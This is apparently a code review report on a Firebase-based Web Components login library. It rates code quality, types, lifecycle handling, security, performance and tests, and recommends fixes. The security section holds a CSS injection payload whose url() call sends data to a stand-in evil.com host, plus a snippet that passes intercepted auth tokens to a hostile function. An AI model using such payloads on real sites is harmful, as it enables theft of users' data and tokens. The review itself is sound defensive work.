# Full Codebase Review: universal-auth-ui

**Date:** 2026-03-29
**Scope:** All production source (~536 LOC), tests (~208 LOC), build config
**Files reviewed:** 13 files across src/, config root

---

## Overall Assessment

Solid, well-structured Web Components library. Clean separation of concerns, good XSS protections, proper Shadow DOM usage. Several production-readiness issues found, mostly around **event listener leaks**, **CSS injection**, **missing disconnectedCallback**, and **test coverage gaps**.

---

## 1. Code Quality: **PASS**

- Clean file organization: core/, components/, styles/, assets/
- Good naming conventions throughout
- DRY: `PASSTHROUGH_ATTRS` pattern in auth-group avoids repetition
- SVG assets properly separated into individual modules
- `DEFAULT_LABELS` and `PROVIDER_THEMES` are well-typed lookup tables

Minor: `VALID_PROVIDERS` duplicated in both `auth-button.ts:8` and `auth-group.ts:4`. Could extract to shared constant, but acceptable at this scale.

---

## 2. TypeScript / Type Safety: **PASS**

- `strict: true` enabled in tsconfig.json
- Proper use of `Record<>`, union types, and type-only exports
- `AuthProvider` union type is source of truth for provider strings
- `FirebaseOptions` re-exported cleanly

Concern (non-blocking):
- `auth-button.ts:40` — `this.getAttribute('provider') as AuthProvider` is an unsafe cast. If attribute is `"facebook"`, it silently becomes `AuthProvider` at compile time. Runtime guard exists at `render()` line 124 (`VALID_PROVIDERS.has(provider)`) but only for logo fallback, not for the auth call itself. An invalid provider would reach `createProvider()` and hit the exhaustive switch with no default — **this throws at runtime with an unhelpful error**.

**Recommendation:** Add a default case to `createProvider()`:
```ts
default:
  throw new Error(`Unsupported auth provider: ${provider}`);
```

---

## 3. Web Component Patterns: **CONCERN**

### Critical: Memory Leak — Missing `disconnectedCallback` and Event Listener Accumulation

**`auth-button.ts:139`** — Every `render()` call creates a new anonymous click listener:
```ts
this.shadowRoot!.querySelector('button')?.addEventListener('click', () => this.handleClick());
```

`render()` is called on `connectedCallback()` AND every `attributeChangedCallback()`. Each attribute change adds another click listener to the new button element. Since `innerHTML` replaces the DOM, old listeners on old elements get GC'd, so this is **not a leak per se** — the old button is garbage collected. However:

1. **No `disconnectedCallback`** — if the element is removed from DOM and re-added, `connectedCallback` fires again, doubling render. More importantly, any external cleanup (timers, observers) cannot be handled.

2. **Re-render on every attribute change** — changing 3 attributes triggers 3 full re-renders. Consider batching with `queueMicrotask`:
```ts
private _renderPending = false;
attributeChangedCallback() {
  if (this.isConnected && !this._renderPending) {
    this._renderPending = true;
    queueMicrotask(() => { this._renderPending = false; this.render(); });
  }
}
```

### Positive:
- `isConnected` guard in `attributeChangedCallback` (both components)
- `composed: true` on all events for Shadow DOM crossing
- `part="button"` and `part="group"` for external styling
- `replaceChildren()` used in auth-group (cleaner than innerHTML)

---

## 4. Security: **CONCERN**

### 4a. XSS — Label: **PASS**
`auth-button.ts:136-137` — Label set via `textContent`, not innerHTML interpolation. Good.

### 4b. XSS — CSS Injection via `gap` attribute: **FAIL**

**`auth-group.ts:34,44`** — The `gap` attribute is interpolated directly into a `<style>` tag:
```ts
const gap = this.getAttribute('gap') || '8px';
// ...
style.textContent = `... gap: var(--auth-group-gap, ${gap}); ...`;
```

An attacker controlling the `gap` attribute can inject arbitrary CSS:
```html
<auth-group gap="8px); } :host { background: url('https://evil.com/exfil?data=')"></auth-group>
```

This breaks out of the `gap` property and injects arbitrary CSS rules. While Shadow DOM limits scope, CSS injection can still exfiltrate data via `url()` side channels or deface the component.

**Fix:** Validate/sanitize the gap value:
```ts
const rawGap = this.getAttribute('gap') || '8px';
const gap = /^[\d.]+(px|em|rem|%|vh|vw)$/.test(rawGap) ? rawGap : '8px';
```

### 4c. Token in Events: **CONCERN**

`auth-button.ts:86-90` — The `auth-success` event contains the full JWT token in `detail`. Since events with `composed: true` + `bubbles: true` propagate to `document`, **any script on the page can intercept the token**:
```js
document.addEventListener('auth-success', e => sendToEvil(e.detail.token));
```

This is a design decision documented in the API, but worth noting:
- Any XSS on the host page captures auth tokens
- Consider documenting this trust boundary explicitly
- Consider an option to omit token from events (let consumers call `getIdToken()` themselves)

### 4d. HTTPS Enforcement: **PASS**
`auth-button.ts:94` — `server-url` must start with `https://`. Good.

### 4e. `postTokenToServer` sends full AuthResult including token: **PASS** (by design)
The POST body includes `{ user, token, provider }`. Token is meant for server verification. Acceptable pattern.

---

## 5. Performance: **CONCERN**

### 5a. Render Batching (see Section 3)
Multiple attribute changes trigger multiple synchronous re-renders. For `<auth-group>` with 5 passthrough attributes, changing them all causes 5 full re-renders.

### 5b. `auth-group` Re-creates All Children on Any Change
`auth-group.ts:33-64` — Every render destroys and recreates all `<auth-button>` children. If a user changes just `theme`, all buttons are torn down and rebuilt. For 3 buttons this is negligible, but the pattern doesn't scale.

### 5c. No Lazy Loading of Firebase
`signInWithProvider` calls `getAuth(app)` on every invocation. Firebase `getAuth()` is cheap (returns cached instance), so this is fine. No issue.

---

## 6. Build Config: **PASS**

- Firebase properly externalized in both ESM and UMD
- UMD globals correctly mapped
- Source maps enabled
- Type declarations generated via separate `rollup-plugin-dts` pass
- `terser` applied for minification
- `package.json` exports field properly configured with import/require/types

Minor: `tsconfig.json` uses `moduleResolution: "bundler"` which is correct for Rollup but consumers using `node` resolution might have issues. The `exports` field in package.json mitigates this.

---

## 7. Test Quality: **CONCERN**

### Coverage Gaps:

| Area | Covered | Missing |
|------|---------|---------|
| `firebase-init.ts` | Basic init, caching, custom config | **Module cache not reset between tests** — tests depend on execution order |
| `auth-service.ts` | All 3 providers, postTokenToServer | **Error paths** (signInWithPopup rejection, network failure on POST) |
| `auth-button.ts` | Render, labels, events, error event | **server-url flow**, **HTTPS rejection**, **loading state**, **double-click guard** |
| `auth-group.ts` | **NO TESTS** | Entire component untested |
| `brand-styles.ts` | No direct tests | Indirectly tested via button render |

### Specific Issues:

**7a. `firebase-init.test.ts` — Shared mutable state across tests**
The `apps` array in the mock (`line 5`) and the `appCache` Map in the real module persist across tests. `vi.clearAllMocks()` resets mock call counts but NOT the accumulated state. Test `it('returns cached app on second call')` works by accident because it runs after the first test already populated the cache.

**Fix:** Use `vi.resetModules()` + dynamic import in `beforeEach`, or expose a `clearCache()` function for testing.

**7b. Missing `auth-group` tests entirely** — No test file for `auth-group.ts`. Should cover:
- Provider list parsing and filtering
- Attribute passthrough to child buttons
- Layout direction (horizontal/vertical)
- Invalid provider filtering
- Gap attribute handling

**7c. Missing negative test cases:**
- Invalid provider attribute behavior
- Non-HTTPS server-url (should NOT trigger POST)
- `server-url` POST failure handling
- Double-click prevention during loading state
- `response.json()` failure fallback to `response.text()`

---

## 8. API Contract / Backwards Compatibility: **PASS**

- Public API is well-defined via `src/index.ts` exports
- `VERSION` exported for runtime checking
- Custom events have stable shape documented in README
- CSS custom properties provide stable styling API

---

## Summary Table

| Category | Rating | Key Issue |
|----------|--------|-----------|
| Code Quality | **PASS** | Minor duplication |
| TypeScript | **PASS** | Unsafe cast on provider attribute (runtime fallback exists) |
| Web Components | **CONCERN** | Missing disconnectedCallback, render batching |
| Security | **CONCERN** | CSS injection via gap attr, token in composed events |
| Performance | **CONCERN** | Unbatched re-renders on attribute changes |
| Build Config | **PASS** | Solid Rollup + TypeScript setup |
| Test Quality | **CONCERN** | No auth-group tests, shared mock state, missing edge cases |

---

## Critical (Blocking)

1. **CSS injection in `auth-group.ts:44`** — Sanitize `gap` attribute before interpolating into `<style>`. Allows arbitrary CSS injection.

2. **No default case in `createProvider()` (`auth-service.ts:26-34`)** — Invalid provider string reaches switch with no default, producing cryptic runtime error.

## High Priority

3. **Missing `auth-group` tests** — Entire component has zero test coverage.

4. **Event listener pattern in `auth-button.ts:139`** — While not a leak due to innerHTML replacement, add `disconnectedCallback` for proper lifecycle hygiene and future-proofing.

5. **Render batching** — Multiple attribute changes trigger multiple synchronous re-renders. Use `queueMicrotask` debounce.

## Medium Priority

6. **Firebase-init test isolation** — Tests share mutable state (`apps` array, `appCache`). Results depend on test execution order.

7. **Missing negative test cases** — No tests for: invalid provider, non-HTTPS server-url rejection, double-click guard, JSON parse fallback.

8. **Token exposure documentation** — `auth-success` event with `composed: true` exposes JWT to any page script. Document this trust boundary.

## Low Priority

9. **`VALID_PROVIDERS` duplication** — Defined in both auth-button.ts and auth-group.ts.

10. **`provider` attribute default** — Defaults to `'google'` silently when omitted. README says "Required" but code doesn't enforce.

---

## Recommended Actions (Prioritized)

1. Add CSS value sanitization for `gap` attribute in auth-group
2. Add default case to `createProvider()` switch statement
3. Create `auth-group.test.ts` with basic rendering + passthrough tests
4. Add `disconnectedCallback` to both components (even if empty, signals intent)
5. Implement render batching with `queueMicrotask`
6. Fix test isolation in firebase-init tests
7. Add negative/edge-case tests for auth-button
8. Document token exposure trust model in README security section

---

## Positive Observations

- XSS prevention via `textContent` assignment (C1 comment) shows security awareness
- HTTPS enforcement on server-url is a good default
- `composed: true` events are correct for Shadow DOM components
- Clean type definitions make the API self-documenting
- `configHash` with `projectId` prevents cache collisions (H4 comment)
- `part` attributes enable external CSS customization
- Firebase properly externalized as peer dependency

---

## Unresolved Questions

1. Should `postTokenToServer` include credentials (cookies) for same-origin server calls? Currently uses default `credentials` policy.
2. Is the default Firebase config (`DEFAULT_CONFIG`) intended for production, or only for demos? If demo-only, consider throwing if no config provided in production builds.
3. Should `auth-group` forward custom `label` attributes per-provider, or is the current passthrough-only design intentional?
